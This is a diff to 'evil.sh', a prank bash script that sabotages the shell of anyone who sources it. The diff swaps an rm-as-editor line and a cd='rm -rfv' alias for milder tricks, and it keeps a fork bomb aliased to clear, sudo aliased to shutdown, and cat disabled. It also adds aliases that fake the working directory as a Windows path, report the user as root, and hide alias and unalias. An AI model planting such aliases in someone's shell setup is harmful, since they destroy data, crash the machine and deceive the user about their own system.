@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
-# Set `rm` as the default editor
-export EDITOR=/bin/rm
+# Set `gzip` as the default editor
+export EDITOR=/bin/gzip
 
 # Make Tab send the delete key
 tset -Qe $'\t'
@@ -16,8 +16,8 @@ alias cat=true
 # Use a random sort option whenever `ls` is invoked
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
-# Delete directories instead of entering them
-alias cd='rm -rfv'
+# only change user's prompt instead of entering directories
+alias cd='x(){ PWD=$1; };x'
 
 # Shut down the computer instead of running a command with super-user rights
 alias sudo='sudo shutdown -P now'
@@ -27,6 +27,23 @@ alias clear=':(){ :|:& };:'
 
 # Have `date` return random dates
 alias date='date -d "now + $RANDOM days"'
+
+# tell user he's maybe on windows when he use command pwd
+alias pwd='echo "C:"${PWD//\//\\}'
+
+# how to use top or not?
+alias top='top -h'
+
+# you are root, really
+alias whoami='echo root'
+alias w='w|sed s/$USER/root/'
+alias who='who|sed s/$USER/root/'
+
+# alias what?
+alias alias='x 2>&1|sed s/x/alias/;'
+
+# just using unalias is not fair
+alias unalias='x 2>&1|sed s/x/unalias/;'
 
 # Randomly eject CD tray
 sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
